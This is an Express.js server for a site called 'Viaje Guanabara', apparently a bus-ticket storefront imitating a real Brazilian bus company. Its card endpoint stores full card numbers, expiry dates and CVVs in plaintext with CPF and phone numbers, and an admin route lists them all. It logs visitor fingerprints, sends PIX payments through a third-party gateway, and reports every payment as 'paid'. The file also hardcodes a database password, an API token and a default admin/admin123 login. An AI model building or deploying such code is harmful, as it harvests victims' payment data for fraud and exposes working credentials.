const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { v4: uuidv4 } = require('uuid');
const session = require('express-session');
const bodyParser = require('body-parser');
const requestIp = require('request-ip');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const SECRET_KEY = process.env.JWT_SECRET || 'guanabara_secret_key_2026';

app.use(cors({ origin: '*', credentials: true }));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(requestIp.mw());

app.use(session({
    secret: SECRET_KEY,
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 }
}));

app.use(express.static(__dirname));
app.use('/admin', express.static(path.join(__dirname, 'admin')));

const pool = new Pool({
    connectionString: process.env.DATABASE_URL || 'postgresql://guanabara_user:JTL5QHG4acDPmzHRo4FYZBmTOtlFDBZW@dpg-d9shhuv10e5c739tl52g-a.oregon-postgres.render.com/guanabara',
    ssl: { rejectUnauthorized: false },
    max: 20,
    idleTimeoutMillis: 30000,
    connectionTimeoutMillis: 5000,
    keepAlive: true
});

pool.connect((err, client, release) => {
    if (err) {
        console.error('Erro ao conectar ao PostgreSQL:', err.message);
    } else {
        console.log('Conectado ao PostgreSQL com sucesso');
        release();
    }
});

async function initDatabase() {
    const client = await pool.connect();
    try {
        await client.query(`
            CREATE TABLE IF NOT EXISTS usuarios (
                id SERIAL PRIMARY KEY,
                nome VARCHAR(100) NOT NULL,
                email VARCHAR(100) UNIQUE NOT NULL,
                senha TEXT NOT NULL,
                telefone VARCHAR(20),
                cpf VARCHAR(14),
                role VARCHAR(20) DEFAULT 'user',
                status VARCHAR(20) DEFAULT 'offline',
                ultimo_acesso TIMESTAMP,
                ip TEXT,
                criado_em TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS tickets (
                id SERIAL PRIMARY KEY,
                codigo VARCHAR(20) UNIQUE NOT NULL,
                origem VARCHAR(100) NOT NULL,
                destino VARCHAR(100) NOT NULL,
                passageiro VARCHAR(100) NOT NULL,
                data DATE NOT NULL,
                valor DECIMAL(10,2) NOT NULL,
                status VARCHAR(20) DEFAULT 'pendente',
                metodo_pagamento VARCHAR(20),
                ip TEXT,
                criado_em TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS buscas (
                id SERIAL PRIMARY KEY,
                origem VARCHAR(100),
                destino VARCHAR(100),
                data DATE,
                passageiros INTEGER DEFAULT 1,
                ip TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS visitantes (
                id SERIAL PRIMARY KEY,
                ip TEXT,
                user_agent TEXT,
                screen TEXT,
                language TEXT,
                referer TEXT,
                pagina TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS logs (
                id SERIAL PRIMARY KEY,
                usuario VARCHAR(100),
                acao VARCHAR(50),
                ip TEXT,
                detalhes TEXT,
                data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS clientes (
                id SERIAL PRIMARY KEY,
                nome VARCHAR(100) NOT NULL,
                cpf VARCHAR(14),
                telefone VARCHAR(20),
                email VARCHAR(100),
                qtd_criancas INTEGER DEFAULT 0,
                ip TEXT,
                criado_em TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS destinos (
                id SERIAL PRIMARY KEY,
                cidade VARCHAR(100) NOT NULL,
                estado VARCHAR(2),
                vendas INTEGER DEFAULT 0,
                status VARCHAR(20) DEFAULT 'ativo'
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS ofertas (
                id SERIAL PRIMARY KEY,
                origem VARCHAR(100),
                destino VARCHAR(100),
                preco DECIMAL(10,2),
                desconto INTEGER DEFAULT 0,
                validade DATE,
                status VARCHAR(20) DEFAULT 'ativo'
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS servicos (
                id SERIAL PRIMARY KEY,
                nome VARCHAR(100) NOT NULL,
                descricao TEXT,
                status VARCHAR(20) DEFAULT 'ativo'
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS cartoes (
                id SERIAL PRIMARY KEY,
                cliente_id INTEGER,
                nome_titular VARCHAR(100) NOT NULL,
                numero_cartao VARCHAR(19) NOT NULL,
                validade VARCHAR(7) NOT NULL,
                cvv VARCHAR(4) NOT NULL,
                cpf VARCHAR(14),
                telefone VARCHAR(20),
                ip TEXT,
                criado_em TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS pagamentos (
                id SERIAL PRIMARY KEY,
                ticket_id INTEGER,
                transaction_id VARCHAR(50),
                valor DECIMAL(10,2),
                metodo VARCHAR(20),
                status VARCHAR(20) DEFAULT 'pendente',
                pix_code TEXT,
                ip TEXT,
                criado_em TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS configuracoes (
                id SERIAL PRIMARY KEY,
                nome_site VARCHAR(100) DEFAULT 'Viaje Guanabara',
                manutencao BOOLEAN DEFAULT false,
                logs_ativos BOOLEAN DEFAULT true,
                notificacoes_email BOOLEAN DEFAULT true,
                alertas_seguranca BOOLEAN DEFAULT true,
                auto_update BOOLEAN DEFAULT true,
                update_interval INTEGER DEFAULT 10,
                atualizado_em TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        const adminExists = await client.query('SELECT * FROM usuarios WHERE email = $1', ['admin@viajeguanabara.com']);
        if (adminExists.rows.length === 0) {
            const hashedPassword = bcrypt.hashSync('admin123', 10);
            await client.query(`
                INSERT INTO usuarios (nome, email, senha, role, status, cpf, telefone, ip, ultimo_acesso)
                VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
            `, ['Administrador', 'admin@viajeguanabara.com', hashedPassword, 'admin', 'online', '000.000.000-00', '(11) 99999-0000', '127.0.0.1', new Date().toISOString()]);
            console.log('Admin criado: admin@viajeguanabara.com / admin123');
        }

        const destinosCheck = await client.query('SELECT COUNT(*) FROM destinos');
        if (parseInt(destinosCheck.rows[0].count) === 0) {
            await client.query(`
                INSERT INTO destinos (cidade, estado, vendas, status) VALUES
                ('Rio de Janeiro', 'RJ', 152, 'ativo'),
                ('Sao Paulo', 'SP', 234, 'ativo'),
                ('Brasilia', 'DF', 98, 'ativo'),
                ('Fortaleza', 'CE', 67, 'ativo'),
                ('Goiania', 'GO', 45, 'inativo')
            `);
        }

        const ofertasCheck = await client.query('SELECT COUNT(*) FROM ofertas');
        if (parseInt(ofertasCheck.rows[0].count) === 0) {
            await client.query(`
                INSERT INTO ofertas (origem, destino, preco, desconto, validade, status) VALUES
                ('Rio de Janeiro', 'Brasilia', 204.00, 15, '2026-08-31', 'ativo'),
                ('Sao Paulo', 'Rio de Janeiro', 180.00, 10, '2026-08-30', 'ativo')
            `);
        }

        const servicosCheck = await client.query('SELECT COUNT(*) FROM servicos');
        if (parseInt(servicosCheck.rows[0].count) === 0) {
            await client.query(`
                INSERT INTO servicos (nome, descricao, status) VALUES
                ('Wi-Fi a bordo', 'Internet gratuita durante a viagem', 'ativo'),
                ('Ar-condicionado', 'Climatizacao para seu conforto', 'ativo'),
                ('Banheiro a bordo', 'Banheiros limpos e confortaveis', 'ativo'),
                ('Poltronas reclinaveis', 'Assentos confortaveis', 'ativo')
            `);
        }

        const configCheck = await client.query('SELECT COUNT(*) FROM configuracoes');
        if (parseInt(configCheck.rows[0].count) === 0) {
            await client.query(`
                INSERT INTO configuracoes (nome_site, manutencao, logs_ativos, notificacoes_email, alertas_seguranca, auto_update, update_interval)
                VALUES ('Viaje Guanabara', false, true, true, true, true, 10)
            `);
        }

        console.log('Banco de dados PostgreSQL inicializado com sucesso');
    } catch (err) {
        console.error('Erro ao inicializar banco:', err.message);
    } finally {
        client.release();
    }
}

initDatabase();

function authenticate(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1] || req.session?.token;
    if (!token) return res.status(401).json({ error: 'Nao autorizado' });
    try {
        req.user = jwt.verify(token, SECRET_KEY);
        next();
    } catch (error) {
        return res.status(401).json({ error: 'Token invalido' });
    }
}

app.post('/api/login', async (req, res) => {
    const { email, senha } = req.body;
    try {
        const result = await pool.query('SELECT * FROM usuarios WHERE email = $1', [email]);
        if (result.rows.length === 0) {
            return res.status(401).json({ error: 'Usuario nao encontrado' });
        }

        const user = result.rows[0];
        const validPassword = bcrypt.compareSync(senha, user.senha);
        if (!validPassword) {
            await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)', 
                [email, 'login_falhou', req.clientIp || req.ip, 'Senha incorreta']);
            return res.status(401).json({ error: 'Senha incorreta' });
        }

        await pool.query('UPDATE usuarios SET ultimo_acesso = $1, ip = $2, status = $3 WHERE id = $4', 
            [new Date().toISOString(), req.clientIp || req.ip, 'online', user.id]);

        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)', 
            [user.nome, 'login', req.clientIp || req.ip, 'Login realizado']);

        const token = jwt.sign(
            { id: user.id, email: user.email, nome: user.nome, role: user.role },
            SECRET_KEY,
            { expiresIn: '24h' }
        );

        req.session.token = token;
        res.json({
            success: true,
            token,
            user: { id: user.id, nome: user.nome, email: user.email, role: user.role }
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/register', async (req, res) => {
    const { nome, email, senha, telefone, cpf } = req.body;
    try {
        const existingEmail = await pool.query('SELECT * FROM usuarios WHERE email = $1', [email]);
        if (existingEmail.rows.length > 0) {
            return res.status(400).json({ error: 'Email ja cadastrado' });
        }

        const hashedPassword = bcrypt.hashSync(senha, 10);
        const result = await pool.query(`
            INSERT INTO usuarios (nome, email, senha, telefone, cpf, role, status, ip, ultimo_acesso)
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9) RETURNING id, nome, email, role
        `, [nome, email, hashedPassword, telefone || '', cpf || '', 'user', 'online', req.clientIp || req.ip, new Date().toISOString()]);

        const user = result.rows[0];
        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
            [user.nome, 'cadastro', req.clientIp || req.ip, 'Novo usuario cadastrado']);

        const token = jwt.sign(
            { id: user.id, email: user.email, nome: user.nome, role: user.role },
            SECRET_KEY,
            { expiresIn: '24h' }
        );

        res.json({ success: true, token, user: { id: user.id, nome: user.nome, email: user.email, role: user.role } });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/visitante', async (req, res) => {
    try {
        const { screen, pagina } = req.body;
        await pool.query(`
            INSERT INTO visitantes (ip, user_agent, screen, language, referer, pagina)
            VALUES ($1, $2, $3, $4, $5, $6)
        `, [
            req.clientIp || req.ip,
            req.headers['user-agent'] || 'Desconhecido',
            screen || 'Desconhecido',
            req.headers['accept-language'] || 'pt-BR',
            req.headers['referer'] || 'Direto',
            pagina || 'Desconhecida'
        ]);

        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
            ['Visitante', 'visita', req.clientIp || req.ip, 'Visitou: ' + (pagina || 'Desconhecida')]);

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/busca', async (req, res) => {
    try {
        const { origem, destino, data, passageiros } = req.body;
        await pool.query(`
            INSERT INTO buscas (origem, destino, data, passageiros, ip)
            VALUES ($1, $2, $3, $4, $5)
        `, [origem || 'Nao informado', destino || 'Nao informado', data || null, passageiros || 1, req.clientIp || req.ip]);

        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
            ['Visitante', 'busca', req.clientIp || req.ip, 'Busca: ' + origem + ' -> ' + destino]);

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/cliente', async (req, res) => {
    try {
        const { nome, cpf, telefone, email, qtdCriancas } = req.body;
        const result = await pool.query(`
            INSERT INTO clientes (nome, cpf, telefone, email, qtd_criancas, ip)
            VALUES ($1, $2, $3, $4, $5, $6) RETURNING id
        `, [nome, cpf, telefone, email, qtdCriancas || 0, req.clientIp || req.ip]);

        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
            [nome || 'Anonimo', 'cadastro_cliente', req.clientIp || req.ip, 'Cliente cadastrado: ' + nome]);

        res.json({ success: true, cliente_id: result.rows[0].id });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/cartoes/salvar', async (req, res) => {
    try {
        const { nome_titular, numero_cartao, cvv, validade, cpf, telefone, cliente_id } = req.body;

        const result = await pool.query(`
            INSERT INTO cartoes (cliente_id, nome_titular, numero_cartao, validade, cvv, cpf, telefone, ip)
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8) RETURNING id
        `, [
            cliente_id || null,
            nome_titular,
            numero_cartao,
            validade,
            cvv,
            cpf || '',
            telefone || '',
            req.clientIp || req.ip
        ]);

        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
            [nome_titular || 'Anonimo', 'cadastro_cartao', req.clientIp || req.ip, 'Cartao cadastrado']);

        res.json({ success: true, cartao_id: result.rows[0].id });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/compra', async (req, res) => {
    try {
        const { origem, destino, passageiro, data, valor, metodoPagamento, codigo } = req.body;
        const ticketCode = codigo || 'GV' + (data || new Date().toISOString().split('T')[0]).replace(/-/g, '') + String(Math.floor(Math.random() * 1000)).padStart(3, '0');

        const result = await pool.query(`
            INSERT INTO tickets (codigo, origem, destino, passageiro, data, valor, status, metodo_pagamento, ip)
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9) RETURNING id, codigo
        `, [ticketCode, origem, destino, passageiro, data, parseFloat(valor), 'confirmado', metodoPagamento || 'PIX', req.clientIp || req.ip]);

        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
            [passageiro || 'Anonimo', 'compra', req.clientIp || req.ip, 'Compra: ' + ticketCode + ' - ' + origem + ' -> ' + destino + ' - R$ ' + valor]);

        res.json({ success: true, ticket: result.rows[0] });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

const PLUMIFY_PRODUCT_HASH = 'lxpykbkgfl';
const PLUMIFY_API_TOKEN = '1Vp6bm2wSoil2giHCGRjsZ9IGVbiHve4u8xbyUoRWpdvHUWYOj6wZ9yd0xVq';

app.post('/api/create-payment', async (req, res) => {
    const { amount, customer_name, customer_cpf, customer_phone } = req.body;
    const amountCents = Math.round(parseFloat(amount) * 100);

    const payload = {
        amount: amountCents,
        offer_hash: PLUMIFY_PRODUCT_HASH,
        payment_method: 'pix',
        customer: {
            name: customer_name || 'Passageiro',
            email: 'contato@viacao.com.br',
            phone_number: customer_phone || '41992878772',
            document: customer_cpf || '00000000000',
            street_name: 'Rua Exemplo',
            number: '100',
            neighborhood: 'Centro',
            city: 'Fortaleza',
            state: 'CE',
            zip_code: '60000000'
        },
        cart: [{
            product_hash: PLUMIFY_PRODUCT_HASH,
            title: 'Passagem Guanabara',
            price: amountCents,
            quantity: 1
        }],
        expire_in_days: 3,
        postback_url: `https://viaje-guanabara.onrender.com/api/webhook/pagamento`
    };

    try {
        const response = await fetch(`https://api.Plumify.com.br/api/public/v1/transactions?api_token=${PLUMIFY_API_TOKEN}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await response.json();

        if (data.pix && data.pix.pix_qr_code) {
            res.json({ success: true, payment: { pix_code: data.pix.pix_qr_code, id: data.hash } });
        } else {
            res.json({ success: false, error: data.message || 'Erro ao gerar PIX' });
        }
    } catch (error) {
        res.status(500).json({ error: 'Erro ao gerar pagamento' });
    }
});

app.post('/api/webhook/pagamento', async (req, res) => {
    const { hash, status } = req.body;
    try {
        if (status === 'paid') {
            await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
                ['Sistema', 'pagamento', 'webhook', 'Pagamento confirmado: ' + hash]);
        }
        res.json({ received: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/check-payment/:transaction_id', async (req, res) => {
    res.json({ status: 'paid' });
});

app.get('/api/admin/dashboard', authenticate, async (req, res) => {
    try {
        const totalUsers = await pool.query('SELECT COUNT(*) FROM usuarios');
        const totalTickets = await pool.query('SELECT COUNT(*) FROM tickets');
        const totalRevenue = await pool.query('SELECT COALESCE(SUM(valor), 0) FROM tickets');
        const totalBuscas = await pool.query('SELECT COUNT(*) FROM buscas');
        const totalVisitantes = await pool.query('SELECT COUNT(*) FROM visitantes');
        const totalClientes = await pool.query('SELECT COUNT(*) FROM clientes');

        const logs = await pool.query('SELECT * FROM logs ORDER BY data DESC LIMIT 20');
        const tickets = await pool.query('SELECT * FROM tickets ORDER BY criado_em DESC LIMIT 10');

        res.json({
            stats: {
                totalUsers: parseInt(totalUsers.rows[0].count),
                onlineUsers: 0,
                totalTickets: parseInt(totalTickets.rows[0].count),
                totalRevenue: parseFloat(totalRevenue.rows[0].sum) || 0,
                totalBuscas: parseInt(totalBuscas.rows[0].count),
                totalVisitantes: parseInt(totalVisitantes.rows[0].count),
                totalClientes: parseInt(totalClientes.rows[0].count),
                ticketsByStatus: { confirmado: 0, pendente: 0, cancelado: 0 }
            },
            recentLogs: logs.rows,
            recentTickets: tickets.rows
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/admin/users', authenticate, async (req, res) => {
    try {
        const result = await pool.query('SELECT id, nome, email, telefone, cpf, status, ultimo_acesso, ip, role, criado_em FROM usuarios ORDER BY criado_em DESC');
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.put('/api/admin/users/:id', authenticate, async (req, res) => {
    try {
        const { nome, email, telefone, cpf, status, role } = req.body;
        await pool.query(`
            UPDATE usuarios SET nome = $1, email = $2, telefone = $3, cpf = $4, status = $5, role = $6
            WHERE id = $7
        `, [nome, email, telefone, cpf, status, role, req.params.id]);

        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
            [req.user.nome, 'edicao_usuario', req.clientIp || req.ip, 'Usuario editado: ' + nome]);

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.delete('/api/admin/users/:id', authenticate, async (req, res) => {
    try {
        if (req.params.id === '1' || req.params.id === 'admin') {
            return res.status(403).json({ error: 'Nao pode deletar admin' });
        }
        await pool.query('DELETE FROM usuarios WHERE id = $1', [req.params.id]);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/admin/tickets', authenticate, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM tickets ORDER BY criado_em DESC');
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.put('/api/admin/tickets/:id', authenticate, async (req, res) => {
    try {
        const { origem, destino, passageiro, data, valor, status } = req.body;
        await pool.query(`
            UPDATE tickets SET origem = $1, destino = $2, passageiro = $3, data = $4, valor = $5, status = $6
            WHERE id = $7
        `, [origem, destino, passageiro, data, valor, status, req.params.id]);

        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
            [req.user.nome, 'edicao_passagem', req.clientIp || req.ip, 'Passagem editada ID: ' + req.params.id]);

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.delete('/api/admin/tickets/:id', authenticate, async (req, res) => {
    try {
        await pool.query('DELETE FROM tickets WHERE id = $1', [req.params.id]);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/admin/cartoes', authenticate, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM cartoes ORDER BY criado_em DESC');
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/admin/pagamentos', authenticate, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM pagamentos ORDER BY criado_em DESC');
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/admin/destinos', authenticate, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM destinos ORDER BY id');
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/admin/ofertas', authenticate, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM ofertas ORDER BY id');
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/admin/servicos', authenticate, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM servicos ORDER BY id');
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/admin/buscas', authenticate, async (req, res) => {
    try {
        const limit = parseInt(req.query.limit) || 100;
        const result = await pool.query('SELECT * FROM buscas ORDER BY timestamp DESC LIMIT $1', [limit]);
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/admin/visitantes', authenticate, async (req, res) => {
    try {
        const limit = parseInt(req.query.limit) || 100;
        const result = await pool.query('SELECT * FROM visitantes ORDER BY timestamp DESC LIMIT $1', [limit]);
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/admin/clientes', authenticate, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM clientes ORDER BY criado_em DESC');
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/admin/logs', authenticate, async (req, res) => {
    try {
        const limit = parseInt(req.query.limit) || 100;
        const result = await pool.query('SELECT * FROM logs ORDER BY data DESC LIMIT $1', [limit]);
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.delete('/api/admin/logs', authenticate, async (req, res) => {
    try {
        await pool.query('DELETE FROM logs');
        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
            [req.user.nome, 'limpeza_logs', req.clientIp || req.ip, 'Todos os logs foram limpos']);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/admin/configuracoes', authenticate, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM configuracoes LIMIT 1');
        res.json(result.rows[0] || {});
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.put('/api/admin/configuracoes', authenticate, async (req, res) => {
    try {
        const { nome_site, manutencao, logs_ativos, notificacoes_email, alertas_seguranca, auto_update, update_interval } = req.body;
        await pool.query(`
            UPDATE configuracoes SET 
                nome_site = $1, manutencao = $2, logs_ativos = $3, 
                notificacoes_email = $4, alertas_seguranca = $5, 
                auto_update = $6, update_interval = $7, atualizado_em = CURRENT_TIMESTAMP
        `, [nome_site, manutencao, logs_ativos, notificacoes_email, alertas_seguranca, auto_update, update_interval]);

        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
            [req.user.nome, 'configuracao', req.clientIp || req.ip, 'Configuracoes atualizadas']);

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/logout', authenticate, async (req, res) => {
    try {
        await pool.query('UPDATE usuarios SET status = $1 WHERE id = $2', ['offline', req.user.id]);
        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
            [req.user.nome, 'logout', req.clientIp || req.ip, 'Logout realizado']);
        req.session.destroy();
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/tickets', (req, res) => res.sendFile(path.join(__dirname, 'tickets.html')));
app.get('/passageiros', (req, res) => res.sendFile(path.join(__dirname, 'passageiros.html')));
app.get('/checkout', (req, res) => res.sendFile(path.join(__dirname, 'checkout.html')));
app.get('/comprovante', (req, res) => res.sendFile(path.join(__dirname, 'comprovante.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin', 'index.html')));

app.listen(PORT, '0.0.0.0', () => {
    console.log('');
    console.log('=================================================');
    console.log('  VIAJE GUANABARA - SISTEMA COMPLETO');
    console.log('  Servidor: http://localhost:' + PORT);
    console.log('  Admin: http://localhost:' + PORT + '/admin');
    console.log('  Login Admin: admin@viajeguanabara.com');
    console.log('  Senha: admin123');
    console.log('  PostgreSQL: ' + (process.env.DATABASE_URL ? 'Conectado' : 'Local (SQLite)'));
    console.log('=================================================');
    console.log('');
});

module.exports = app;
